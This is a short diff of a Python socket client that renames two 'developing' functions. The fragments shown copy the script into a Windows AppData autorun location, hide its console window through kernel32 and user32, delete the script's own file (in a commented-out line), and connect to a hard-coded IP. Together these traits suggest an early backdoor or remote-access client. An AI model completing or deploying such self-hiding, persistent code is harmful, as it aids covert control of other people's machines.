@@ -19,7 +19,7 @@ def ConnectToServer(hostIP, port):
     return clientSocket
 
 # Developing function
-def setAutoRunScript():
+def SetAutoRunScript():
     exeOriginPath = os.path.abspath(os.getcwd()) + "\Python-Socket-Test-Client.py"
     exeTargetPath = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows"
 
@@ -60,7 +60,7 @@ def setAutoRunScript():
     # os.system("del Python-Socket-Test-Client.py")
 
 # Developing function
-def hideWindows():
+def HideWindows():
     kernel32 = ctypes.WinDLL('kernel32')
     user32 = ctypes.WinDLL('user32')
 
@@ -73,10 +73,10 @@ def hideWindows():
 
 def Main():
     # Developing function
-    # hideWindows()
+    # HideWindows()
 
     # Developing function
-    # setAutoRunScript()
+    # SetAutoRunScript()
 
     # Set server IP and port
     hostIP = '192.168.50.131'
